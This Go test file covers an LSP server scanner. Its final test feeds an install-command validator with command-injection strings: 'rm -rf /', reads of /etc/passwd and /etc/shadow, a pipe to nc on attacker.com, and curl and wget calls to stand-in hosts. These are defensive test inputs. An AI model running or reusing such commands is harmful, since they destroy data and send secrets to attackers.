package lsp

import (
	"context"
	"testing"
	"time"
)

func TestNewScanner(t *testing.T) {
	scanner := NewScanner()
	if scanner == nil {
		t.Fatal("NewScanner() returned nil")
	}
	if scanner.servers == nil {
		t.Error("scanner.servers should be initialized")
	}
	if len(scanner.paths) == 0 {
		t.Error("scanner.paths should not be empty")
	}
}

func TestKnownLSPServers(t *testing.T) {
	expectedLanguages := []string{
		"go", "rust", "python", "java", "csharp",
		"typescript", "javascript", "moonbit", "c", "cpp",
	}

	for _, lang := range expectedLanguages {
		found := false
		for _, server := range KnownLSPServers {
			if server.Language == lang {
				found = true
				if len(server.Executables) == 0 {
					t.Errorf("LSP server for %s has no executables", lang)
				}
				if len(server.Capabilities) == 0 {
					t.Errorf("LSP server for %s has no capabilities", lang)
				}
				break
			}
		}
		if !found {
			t.Errorf("Missing LSP server for language: %s", lang)
		}
	}
}

func TestScannerScan(t *testing.T) {
	scanner := NewScanner()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	servers, err := scanner.Scan(ctx)
	if err != nil {
		t.Fatalf("Scan() error = %v", err)
	}

	// Should have scanned all known servers
	if len(servers) < len(KnownLSPServers) {
		t.Errorf("Scan() returned %d servers, expected at least %d", len(servers), len(KnownLSPServers))
	}

	// Check that we have both installed and not_installed servers
	var installed, notInstalled int
	for _, server := range servers {
		if server.Status == LSPStatusInstalled {
			installed++
		} else if server.Status == LSPStatusNotInstalled {
			notInstalled++
		}
	}

	t.Logf("Installed: %d, Not Installed: %d", installed, notInstalled)

	if installed == 0 {
		t.Log("Warning: No LSP servers detected (this might be expected in CI)")
	}
}

func TestScannerGetServers(t *testing.T) {
	scanner := NewScanner()
	ctx := context.Background()

	// Scan first
	_, _ = scanner.Scan(ctx)

	servers := scanner.GetServers()
	if len(servers) == 0 {
		t.Error("GetServers() returned empty after Scan()")
	}
}

func TestScannerGetServersByLanguage(t *testing.T) {
	scanner := NewScanner()
	ctx := context.Background()

	// Scan first
	_, _ = scanner.Scan(ctx)

	// Test for languages that have unique LSP servers
	uniqueLanguages := []string{"go", "rust", "python", "java", "csharp", "moonbit"}

	for _, lang := range uniqueLanguages {
		servers := scanner.GetServersByLanguage(lang)
		if len(servers) == 0 {
			t.Errorf("GetServersByLanguage(%s) returned empty", lang)
		}
	}

	// Note: typescript and javascript share typescript-language-server
	// c and cpp share clangd, so they might not have unique entries
}

func TestScannerGetInstalledServers(t *testing.T) {
	scanner := NewScanner()
	ctx := context.Background()

	// Scan first
	_, _ = scanner.Scan(ctx)

	installed := scanner.GetInstalledServers()
	// Just verify it doesn't crash
	for _, server := range installed {
		if server.Status != LSPStatusInstalled && server.Status != LSPStatusRunning {
			t.Errorf("GetInstalledServers() returned server with status %s", server.Status)
		}
	}
}

func TestScannerGetMissingServers(t *testing.T) {
	scanner := NewScanner()
	ctx := context.Background()

	// Scan first
	_, _ = scanner.Scan(ctx)

	missing := scanner.GetMissingServers()
	// Just verify it doesn't crash
	for _, server := range missing {
		if server.Status != LSPStatusNotInstalled {
			t.Errorf("GetMissingServers() returned server with status %s", server.Status)
		}
	}
}

func TestScannerRefresh(t *testing.T) {
	scanner := NewScanner()
	ctx := context.Background()

	// Initial scan
	_, _ = scanner.Scan(ctx)

	// Refresh
	servers, err := scanner.Refresh(ctx)
	if err != nil {
		t.Fatalf("Refresh() error = %v", err)
	}

	if len(servers) < len(KnownLSPServers) {
		t.Errorf("Refresh() returned %d servers, expected at least %d", len(servers), len(KnownLSPServers))
	}
}

func TestLSPStatusString(t *testing.T) {
	statuses := []LSPStatus{
		LSPStatusInstalled,
		LSPStatusNotInstalled,
		LSPStatusRunning,
		LSPStatusError,
		LSPStatusUnknown,
	}

	for _, status := range statuses {
		if status == "" {
			t.Error("LSPStatus should not be empty string")
		}
	}
}

func TestScannerCallbacks(t *testing.T) {
	scanner := NewScanner()

	detectedCalled := false
	statusChangedCalled := false

	scanner.OnDetected(func(server *LSPServer) {
		detectedCalled = true
	})

	scanner.OnStatusChange(func(id string, status LSPStatus) {
		statusChangedCalled = true
	})

	ctx := context.Background()
	if _, err := scanner.Scan(ctx); err != nil {
		t.Fatalf("Scan failed: %v", err)
	}

	// At least one server should trigger the callback
	if !detectedCalled {
		t.Error("OnDetected callback was not called during Scan()")
	}

	t.Logf("detectedCalled: %v, statusChangedCalled: %v", detectedCalled, statusChangedCalled)
}

func TestIsSafeInstallCommand(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		expected bool
	}{
		// Safe commands
		{"npm install", "npm install typescript-language-server", true},
		{"pip install", "pip install python-lsp-server", true},
		{"go install", "go install golang.org/x/tools/gopls@latest", true},
		{"cargo install", "cargo install rust-analyzer", true},
		{"brew install", "brew install llvm", true},

		// Command injection attempts - should be rejected
		{"semicolon injection", "npm install ; rm -rf /", false},
		{"double ampersand", "pip install && cat /etc/passwd", false},
		{"pipe injection", "go install | nc attacker.com 4444", false},
		{"backtick injection", "npm install `whoami`", false},
		{"dollar paren", "pip install $(curl attacker.com)", false},
		{"dollar brace", "go install ${PATH}", false},
		{"redirect out", "npm install > /tmp/pwned", false},
		{"redirect in", "pip install < /etc/passwd", false},
		{"newline injection", "npm install\nrm -rf /", false},
		{"carriage return", "pip install\rcat /etc/shadow", false},

		// Unknown prefix - should be rejected
		{"unknown command", "wget http://evil.com/malware", false},
		{"partial match", "npm-install evil-package", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isSafeInstallCommand(tt.cmd)
			if result != tt.expected {
				t.Errorf("isSafeInstallCommand(%q) = %v, want %v", tt.cmd, result, tt.expected)
			}
		})
	}
}
